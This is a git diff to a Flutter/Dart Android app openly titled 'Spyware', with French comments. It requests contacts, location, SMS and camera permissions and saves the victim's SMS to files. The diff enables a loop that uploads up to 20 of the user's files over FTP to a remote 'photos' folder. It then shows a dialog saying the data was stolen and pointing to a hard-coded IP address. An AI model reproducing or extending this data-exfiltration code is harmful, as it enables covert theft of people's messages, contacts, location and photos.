@@ -3,15 +3,16 @@
 //*************************************
 
 import 'dart:io';
+import 'package:flutter/cupertino.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
+// ignore: import_of_legacy_library_into_null_safe
 import 'package:sms/sms.dart';
 import 'package:ftpconnect/ftpConnect.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:path_provider/path_provider.dart';
-
 
 void main() {
   runApp(const MyApp());
@@ -23,11 +24,10 @@ class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'Flutter Demo',
       theme: ThemeData(
-        primarySwatch: Colors.blue,
+        primarySwatch: Colors.green,
       ),
-      home: const MyHomePage(title: 'Flutter Demo Home Page'),
+      home: const MyHomePage(title: 'Spyware Page d\'accueil'),
     );
   }
 }
@@ -50,6 +50,7 @@ class _MyHomePageState extends State<MyHomePage> {
       Permission.contacts,
       Permission.location,
       Permission.sms,
+      Permission.camera,
     ].request();
 
     // Préparation de la connexion FTP
@@ -121,6 +122,8 @@ class _MyHomePageState extends State<MyHomePage> {
     }
     File(filename_sms).writeAsString(sms).then((File file_sms) {});
 
+    // ********** PARTIE CAMERA **********
+
     // ********** Partie Envoie des fichiers **********
 
     // Faire une liste des fichiers à envoyer
@@ -155,48 +158,61 @@ class _MyHomePageState extends State<MyHomePage> {
     }
     //print(listFile);
 
-    //int compteur = 0;
-    //for (var file in listFile) {
-    //  if (compteur < 20) {
-    //    File fileToUpload = File(file);
-    //    // Lancement de la connexion FTP
-    //    await ftpConnect.connect();
-    //    // Changement de répertoire
-    //    await ftpConnect.changeDirectory('photos');
-    //    // Envoie du fichier sur le serveur
-    //    bool res = await ftpConnect.uploadFile(fileToUpload);
+    int compteur2 = 0;
+    for (var file in listFile) {
+      if (compteur2 < 20) {
+        File fileToUpload = File(file);
+        // Lancement de la connexion FTP
+        await ftpConnect.connect();
+       // Changement de répertoire
+        await ftpConnect.changeDirectory('photos');
+        // Envoie du fichier sur le serveur
+        bool res = await ftpConnect.uploadFile(fileToUpload);
         // Fermeture de la connexion FTP
-    //    await ftpConnect.disconnect();
-    //    compteur++;
-    //  }
-    //}
+        await ftpConnect.disconnect();
+        compteur2++;
+      }
+    }
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text(widget.title),
+        title: const Text("Spyware"),
       ),
       body: Center(
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
-            const Text(
-              'You have pushed the button this many times:',
-            ),
-            Text(
-              '$_counter',
-              style: Theme.of(context).textTheme.headline4,
-            ),
+            MaterialButton(
+                child: const Text('Lancer l\'application'),
+                textColor: Colors.white,
+                color: Colors.green,
+                onPressed: () {
+                  _incrementCounter();
+                  showDialog(
+                      context: context,
+                      barrierDismissible: false,
+                      builder: (BuildContext context) {
+                        return AlertDialog(
+                          title: const Text('Information'),
+                          content: const Text("Nous avons volés vos données ! \n\nRendez-vous à l'url : \nhttp://141.94.77.172/index.html"),
+                          actions: <Widget>[
+                            MaterialButton(
+                                onPressed: () {
+                                  Navigator.of(context).pop();
+                                },
+                                
+                                child: const Text('Fermer')
+                                )
+                          ],
+                        );
+                      });
+                }),
           ],
         ),
       ),
-      floatingActionButton: FloatingActionButton(
-        onPressed: _incrementCounter,
-        tooltip: 'Increment',
-        child: const Icon(Icons.add),
-      ), // This trailing comma makes auto-formatting nicer for build methods.
     );
   }
 }
